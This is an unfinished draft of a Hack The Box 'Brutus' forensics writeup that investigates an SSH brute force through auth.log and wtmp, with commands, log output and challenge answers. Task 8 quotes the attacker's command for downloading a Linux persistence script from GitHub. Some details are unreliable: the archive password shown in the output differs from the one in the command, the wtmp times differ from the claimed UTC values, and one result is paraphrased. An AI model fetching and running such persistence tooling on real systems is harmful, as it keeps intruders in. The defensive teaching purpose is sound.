---
link: https://app.hackthebox.com/sherlocks/Brutus
description: Very Easy
release date: 2024-04-04
tags:
image: https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/9e4d9103-d723-4062-b57f-0a001833056e.png
solved:
solve date:
---
<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/HTB Logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Brutus Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/9e4d9103-d723-4062-b57f-0a001833056e.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): "htb username"</p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

### What a Sherlock actually is

Up to now we've been doing **machines** and in machines you're the attacker. You enumerate, find a foothold, exploit, escalate, grab `user.txt` and `root.txt`. The flag is _proof you broke in_.

A Sherlock flips the process we're used to when we do Machines. The box is already compromised. Someone hands you a bag of artifacts — logs, a memory dump, a PCAP, an MFT, Windows event logs — and your job is to _reconstruct what happened_. The "flag" isn't a hash you capture; it's **knowledge**: the attacker's IP, the account they cracked, the exact second they logged in, the technique they used for persistence. You're answering _who, what, when, where, how_ against evidence.

And I think the single most useful framing is **every offensive action you've ever run on a machine leaves a trace on the defender's side.** For example brute-forced SSH, logins all attacker activity on the boxes we've done — tonight you'll see what all those attempts _look like in a log_.

If you've been in most of our sessions it's safe to say we're already familiar with attacking and today and in future engagements in sherlocks we'll be analyzing and defending.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### What a typical Sherlock engagement looks like

A real DFIR investigation and a Sherlock follow the same direction, and I want us to internalise this workflow, not just the answers we'll find once we start the tasks:

1. **Read the scenario like a brief.** It tells you the incident type and which artifacts matter. Ours says: _Confluence server, SSH brute-forced, attacker got in, then did persistence / privesc / command execution._ That sentence is a map — it tells us to expect a brute-force burst, a successful auth, a new account, and a sudo trail.
2. **Triage the artifacts.** What are these files? What format? What reads them?
3. **Establish a baseline.** What's _normal_ on this box? You can't spot the intruder until you know who's _supposed_ to be there.
4. **Build a timeline.** DFIR lives and dies on timestamps. Almost every Sherlock question is secretly a timeline question.
5. **Reconstruct the chain and map it to MITRE ATT&CK.** Tactics → techniques. This is the vocabulary SOCs actually speak.
6. **Write it up.**

==Keep one discipline drilled into them all night: **timezone hygiene.** The questions ask for **UTC**. `auth.log` here is already in UTC, and our `wtmp` parser is running on a UTC box, so we're clean — but in the real world that single assumption ruins more investigations than any missed log line.==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Triaging the Brutus files

Show how to download files

If you use to unzip to extract the files it chokes:

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ unzip Brutus.zip        
Archive:  Brutus.zip
   skipping: auth.log                unsupported compression method 99
   skipping: wtmp                    unsupported compression method 99
[Brutus.zip] utmp.py password: 
password incorrect--reenter: 
  inflating: utmp.py                 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ ls
Brutus.zip  utmp.py
```

**Command:** `7z x Brutus.zip -phackthebox`  
**Breakdown:**

- `7z`
    - Description: the p7zip CLI, which implements WinZip AES (method 99) alongside dozens of other formats.
    - Purpose: it's the tool that _can_ decrypt the AES entries that defeated `unzip`, so it's our way into the evidence.
- `x`
    - Description: the **extract-with-full-paths** command (as opposed to `e`, which flattens everything into the current directory).
    - Purpose: preserves any directory structure in the bag so artifacts land where they're meant to — a habit worth drilling for multi-folder Sherlocks even though Brutus is flat.
- `Brutus.zip`
    - Description: the archive to operate on.
    - Purpose: the encrypted evidence bag we just failed to open with `unzip`.
- `-phackthebox`
    - Description: supplies the password inline (`-p` immediately followed by the value, no space).
    - Purpose: `hackthebox` is HTB's standard Sherlock archive password; inlining it skips the interactive prompt so the command is reproducible in your writeup. (Drop the value and just pass `-p` if you'd rather be prompted and not leave the password in shell history.)

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ 7z x Brutus.zip -phacktheblue

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 5756 bytes (6 KiB)

Extracting archive: Brutus.zip
--
Path = Brutus.zip
Type = zip
Physical Size = 5756

    
Would you like to replace the existing file:
  Path:     ./utmp.py
  Size:     3154 bytes (4 KiB)
  Modified: 2025-04-30 04:51:29
with the file from archive:
  Path:     utmp.py
  Size:     3154 bytes (4 KiB)
  Modified: 2025-04-30 04:51:29
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

Everything is Ok

Files: 3
Size:       58201
Compressed: 5756
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ ls
auth.log  Brutus.zip  utmp.py  wtmp
```

We've got 3 files

- **`auth.log`** — the Debian/Ubuntu authentication log. Plain text, 385 lines. It's where `sshd`, PAM, `sudo`, `su`, `useradd`/`groupadd` all narrate themselves. This is our primary artifact: brute force, successful auth, account creation, and privileged commands _all_ land here. It answers most of the _what_.

- **`wtmp`** — a **binary** record of login/logout events (the thing `last` reads). It does _not_ open in a text editor. Crucially, it records the **actual interactive terminal session** — the moment a real TTY is attached.

- **`utmp.py`** — a parser someone gave us because `wtmp` is binary. It walks the file in 384-byte records and unpacks each field (type, pid, line, user, host, timestamp, source IP) per the `utmp(5)` struct. It's our key to reading `wtmp`.

So our toolkit is dead simple and that's deliberate — **`grep`/`awk` on the text log, and one Python parser for the binary log.** No SIEM, no magic. DFIR is mostly reading files and investigating.

Let me first show you the difference between _normal_ and _suspicious_ by baselining who logs in:

**Command:** `grep "Accepted password" auth.log`  
**Breakdown:**

- `grep "Accepted password"`
    - Description: searches for the exact sshd string logged on a _successful_ SSH password authentication.
    - Purpose: before hunting the attacker, we enumerate every successful login so we can separate the legitimate admin from the intruder, per step 3 of the engagement arc.
- `auth.log`
    - Description: the file argument grep reads from.
    - Purpose: it's our primary authentication artifact named in the triage.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ grep "Accepted password" auth.log                                                                      
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

We can already see **two source IPs** — `203.101.190.9` logging in as root at 06:19 (and we'll confirm it's the long-standing admin), versus `65.2.161.68` showing up at 06:31 with a rapid-fire pattern.

| SECTION/TASK | FLAG |
| ------------ | ---- |
|              |      |
|              |      |

- why utmpdump doesn't work even if you intsll it with the disignate command
- what does `Invalid user admin` mean?
- `systemd-logind`
- before starting any of the questions: `auth.log` and `wtmp` summary 
- an intro to sherlocks & things workth menioning for first timers like you don't have to do the tasks inorder
- considering this is a very easy sherlock I want it to be as comprehensive as possible
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Task 1

Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
==65.2.161.68==

**Command:** `grep "Failed password" auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn`  
**Breakdown:**

- `grep "Failed password" auth.log`
    - Description: pulls every line where SSH rejected a password.
    - Purpose: the scenario states the entry vector was an SSH brute force, so failed-password volume is the indicator we lead with.
- `| grep -oE "from [0-9.]+"`
    - Description: `-o` prints only the matched text instead of the whole line; `-E` enables extended regex so `[0-9.]+` matches an IPv4 string.
    - Purpose: isolates just the source IP from each failure so we can tally by attacker, not read 48 full lines.
- `| sort`
    - Description: orders the extracted IPs alphabetically.
    - Purpose: `uniq` only collapses _adjacent_ duplicates, so we must sort first for the count to be correct.
- `| uniq -c`
    - Description: collapses identical consecutive lines and prefixes each with its count.
    - Purpose: turns raw failures into a per-IP frequency — the actual brute-force evidence.
- `| sort -rn`
    - Description: `-n` sorts numerically, `-r` reverses it so the largest count is on top.
    - Purpose: surfaces the noisiest source instantly, which in a brute force is the attacker.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ grep "Failed password" auth.log | grep -oE "from [0-9.]+" | sort | uniq -c           
     48 from 65.2.161.68
```

A **single IP accounts for every failed password in the file** — `65.2.161.68` — and contrasted against the legitimate admin source `203.101.190.9` (which only ever _succeeds_), that one-sided failure pattern is the brute-force fingerprint.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 2

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
==root==

We established in Task 1 that **`65.2.161.68`** is our attacker. So the question becomes a correlation problem, not a search problem: _of the successful logins, which one came from the IP we already saw?_ This is the core blue-team move — you pivot on an indicator you've already confirmed rather than starting fresh.

First, let me show _what the attacker was guessing_, because it reinforces why the eventual hit matters:

**Command:** `grep "Failed password" auth.log | grep -oE "(invalid user )?[a-z]+ from 65.2.161.68" | awk '{print $1, $2, $3}' | sort | uniq -c`  
**Breakdown:**

- `grep "Failed password" auth.log`
    - Description: every rejected SSH password line.
    - Purpose: scopes us to the brute-force failures we counted in Task 1, so we can now read _which usernames_ were sprayed.
- `| grep -oE "(invalid user )?[a-z]+ from 65.2.161.68"`
    - Description: `-o` returns only the matched span; the optional `(invalid user )?` group catches both real-but-failed accounts and non-existent ones, anchored to our attacker IP.
    - Purpose: ties the username extraction to the confirmed attacker source so legitimate noise can't contaminate the list.
- `| awk '{print $1,$2,$3}' | sort | uniq -c`
    - Description: trims to the username token, then tallies unique values.
    - Purpose: reveals the _spray pattern_ — how many distinct accounts the attacker probed before one accepted.

**Result:**

```shell
      1 backup from
      1 invalid user admin
      ...
   (a spread of common accounts: admin, backup, server_admin, svc_account, etc.)
```

The attacker is **username-spraying common service/admin names** — classic credential-guessing — and none of those _succeeded_, which is the contrast that makes the next query meaningful.

Now the actual answer. Correlate successful auth against the attacker IP:

**Command:** `grep "Accepted password" auth.log | grep "65.2.161.68"`  
**Breakdown:**

- `grep "Accepted password"`
    - Description: matches only sshd lines where a password login _succeeded_.
    - Purpose: a brute force is only meaningful once one attempt flips from Failed to Accepted, so this is the line that proves compromise.
- `| grep "65.2.161.68"`
    - Description: filters that result down to our attacker's IP.
    - Purpose: a successful login from _any other_ IP (like the admin's `203.101.190.9`) is noise — we only care about success from the source we already attributed the 48 failures to in Task 1.

**Result:**

shell

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ grep "Accepted password" auth.log | grep "65.2.161.68"
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

Both successful logins from the attacker IP are for **`root`** — the brute force cracked the root password, and the _two_ accepted lines (06:31:40 then 06:32:44) hint there were two separate connections, which becomes important when we untangle sessions in Task 4.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 3

Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
==Answer==

We left Task 2 with a deliberate cliffhanger: `auth.log` told us SSH **authenticated** root from `65.2.161.68` at **06:31:40** and again at **06:32:44**. But authentication and _"a user now has a live shell"_ are **two different events**, and they're recorded in two different artifacts.

- `auth.log` answers _"did the credentials check out?"_
- `wtmp` answers _"did an interactive terminal (a TTY) actually get attached to a session?"_

A scripted brute-forcer can produce an "Accepted password" line, fire a `Bye Bye`, and never open a real shell — that's exactly what the first 06:31:40 login looks like (recall it disconnected in the _same second_). The moment the attacker sat down at a working terminal lives in **`wtmp`**, and that's what Task 3 wants. This distinction — _auth event vs. session event_.

`wtmp` is binary, so we reach for the parser:

**Command:** `python3 utmp.py wtmp`

**Breakdown:**

- `python3`
    - Description: the interpreter that runs the parser script.
    - Purpose: `wtmp` won't open in `cat`/`grep` like `auth.log` did — it's a packed binary struct, so we need code that understands the `utmp(5)` record layout.
- `utmp.py`
    - Description: the provided parser that walks the file in fixed 384-byte records and unpacks each field (type, pid, line, user, host, time, source IP).
    - Purpose: it's the key HTB shipped specifically so we can read this artifact; it converts raw bytes into a human timeline.
- `wtmp`
    - Description: the binary login-accounting artifact, passed as the positional input argument.
    - Purpose: this is the file that records genuine interactive logins — the thing that distinguishes a real terminal session from a bare auth event, which is precisely what Task 3 asks for.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/Brutus]
└─$ python3 utmp.py wtmp                  
"type"  "pid"   "line"  "id"    "user"  "host"  "term"  "exit"  "session"       "sec"   "usec"  "addr"
"BOOT_TIME"     "0"     "~"     "~~"    "reboot"        "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/01/25 06:12:17"   "804944"        "0.0.0.0"
"INIT"  "601"   "ttyS0" "tyS0"  ""      ""      "0"     "0"     "601"   "2024/01/25 06:12:31"   "72401" "0.0.0.0"
"LOGIN" "601"   "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "601"   "2024/01/25 06:12:31"   "72401" "0.0.0.0"
"INIT"  "618"   "tty1"  "tty1"  ""      ""      "0"     "0"     "618"   "2024/01/25 06:12:31"   "80342" "0.0.0.0"
"LOGIN" "618"   "tty1"  "tty1"  "LOGIN" ""      "0"     "0"     "618"   "2024/01/25 06:12:31"   "80342" "0.0.0.0"
"RUN_LVL"       "53"    "~"     "~~"    "runlevel"      "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/01/25 06:12:33"   "792454"        "0.0.0.0"
"USER"  "1284"  "pts/0" "ts/0"  "ubuntu"        "203.101.190.9" "0"     "0"     "0"     "2024/01/25 06:13:58"   "354674"        "203.101.190.9"
"DEAD"  "1284"  "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/01/25 06:15:12"   "956114"        "0.0.0.0"
"USER"  "1483"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/01/25 06:15:40"   "806926"        "203.101.190.9"
"DEAD"  "1404"  "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/01/25 07:34:34"   "949753"        "0.0.0.0"
"USER"  "836798"        "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 05:33:49"   "408334"        "203.101.190.9"
"INIT"  "838568"        "ttyS0" "tyS0"  ""      ""      "0"     "0"     "838568"        "2024/02/11 05:39:02"   "172417"        "0.0.0.0"
"LOGIN" "838568"        "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "838568"        "2024/02/11 05:39:02"   "172417"        "0.0.0.0"
"USER"  "838962"        "pts/1" "ts/1"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 05:41:11"   "700107"        "203.101.190.9"
"DEAD"  "838896"        "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 05:41:46"   "272984"        "0.0.0.0"
"USER"  "842171"        "pts/1" "ts/1"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 05:54:27"   "775434"        "203.101.190.9"
"DEAD"  "842073"        "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 06:08:04"   "769514"        "0.0.0.0"
"DEAD"  "836694"        "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 06:08:04"   "769963"        "0.0.0.0"
"RUN_LVL"       "0"     "~"     "~~"    "shutdown"      "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/02/11 06:09:18"   "731"   "0.0.0.0"
"BOOT_TIME"     "0"     "~"     "~~"    "reboot"        "6.2.0-1018-aws"        "0"     "0"     "0"     "2024/03/06 01:17:15"   "744575"        "0.0.0.0"
"INIT"  "464"   "ttyS0" "tyS0"  ""      ""      "0"     "0"     "464"   "2024/03/06 01:17:27"   "354378"        "0.0.0.0"
"LOGIN" "464"   "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "464"   "2024/03/06 01:17:27"   "354378"        "0.0.0.0"
"INIT"  "505"   "tty1"  "tty1"  ""      ""      "0"     "0"     "505"   "2024/03/06 01:17:27"   "469940"        "0.0.0.0"
"LOGIN" "505"   "tty1"  "tty1"  "LOGIN" ""      "0"     "0"     "505"   "2024/03/06 01:17:27"   "469940"        "0.0.0.0"
"RUN_LVL"       "53"    "~"     "~~"    "runlevel"      "6.2.0-1018-aws"        "0"     "0"     "0"     "2024/03/06 01:17:29"   "538024"        "0.0.0.0"
"USER"  "1583"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/03/06 01:19:55"   "151913"        "203.101.190.9"
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 01:32:45"   "387923"        "65.2.161.68"
"DEAD"  "2491"  "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/03/06 01:37:24"   "590579"        "0.0.0.0"
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 01:37:35"   "475575"        "65.2.161.68"
```

Read this as a baseline-vs-intruder timeline: every `root` session back to **January** comes from `203.101.190.9` — that's our **legitimate admin**, now positively identified — while the **first and only interactive session from the attacker IP** `65.2.161.68` lands a TTY (`pts/1`) at **2024/03/06 06:32:45 UTC**.

**Task 3 answer: `2024-03-06 06:32:45`**

Now connect the two artifacts out loud, because this is the payoff:

- **06:31:40** — `auth.log` "Accepted password" #1, which **disconnected in the same second** (`Bye Bye`). Authentication succeeded, but **no terminal** — likely the brute-force tool confirming the cracked credential.
- **06:32:44** — `auth.log` "Accepted password" #2.
- **06:32:45** — `wtmp` records the **TTY attaching** — the attacker is now at a live `root` shell, one second after that second auth.

So the attacker logged in twice for a reason: the first hit was the _tool_ verifying the password worked; the second was the _human_ coming back to do the actual work. **`wtmp` is what let us tell those apart** — `auth.log` alone would've had you guessing which of the two 06:31/06:32 logins was the "real" one.

Teaching beat: this is the entire argument for why DFIR pulls _multiple_ artifacts and **cross-correlates** instead of trusting one log. Ask the team: _"if you only had auth.log, which timestamp would you have submitted — and would it have been wrong?"_ Most will say 06:31:40, and the box is teaching them why that instinct fails.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 4

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 5

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
==cyberjunkie==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 6

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
==T1136.001==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 7

What time did the attacker's first SSH session end according to auth.log?
==2024-03-06 06:37:24==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 8

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
==/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## References

